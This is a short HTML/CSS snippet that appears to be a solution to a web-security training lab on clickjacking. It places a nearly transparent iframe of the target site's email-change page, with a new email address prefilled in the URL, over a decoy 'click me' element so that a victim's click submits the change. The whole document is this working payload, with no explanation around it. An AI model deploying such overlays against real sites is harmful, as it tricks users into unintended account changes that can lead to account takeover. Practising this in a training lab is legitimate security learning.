#use the following HTML
<style>
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0.1;
            z-index: 2;
        }

        div {
            position: absolute;
            top: 400px;
            left: 60px;
            z-index: 1;
        }
    </style>

    <div>click me</div>
    <iframe src="https://ac441f3d1f22ac8e80f1013d004500bc.web-security-academy.net/email?email=teste%40teste.com"></iframe>